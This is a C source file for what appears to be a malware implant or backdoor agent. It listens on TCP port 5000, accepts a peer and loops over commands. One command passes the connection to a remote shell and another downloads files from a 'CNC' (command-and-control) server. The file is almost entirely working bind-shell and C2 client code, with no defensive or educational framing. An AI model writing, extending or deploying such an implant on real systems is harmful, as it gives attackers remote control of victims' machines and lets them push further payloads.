#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>

#include "shell.h"
#include "file.h"

#define PORT 5000
#define CMD_TYPE_BUFSIZE 0x4

enum CommandType
{
    SHELL = 0x0,
    DOWNLOAD_FILE_FROM_CNC = 0x1,
};

int start_server()
{
    int server_fd;
    struct sockaddr_in address = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port = htons(PORT)};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("Failed to create a socket.");
        exit(EXIT_FAILURE);
    }

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        perror("Failed to bind a socket.");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0)
    {
        perror("Failed to listen on the socket.");
        exit(EXIT_FAILURE);
    }
    return server_fd;
}

void start_agent()
{
    unsigned int peer_fd, cmd_type, server_fd = start_server();

    puts("Starting the agent.");
    puts("Accepting a peer.");
    if ((peer_fd = accept(server_fd, (struct sockaddr *)NULL, NULL)) < 0)
    {
        perror("Failed to accept the peer.");
        exit(EXIT_FAILURE);
    }
    while (1)
    {
        cmd_type = 0;
        puts("Waiting for command from peer.");
        if (read(peer_fd, &cmd_type, sizeof(cmd_type)) < 0)
        {
            perror("Failed to read command from the peer.");
            exit(EXIT_FAILURE);
        }
        switch (cmd_type)
        {
        case SHELL:
            shell(peer_fd);
            break;
        case DOWNLOAD_FILE_FROM_CNC:
            download_from_cnc(peer_fd);
            break;
        default:
            puts("Unknown command type.");
        }
    }
    close(peer_fd);
}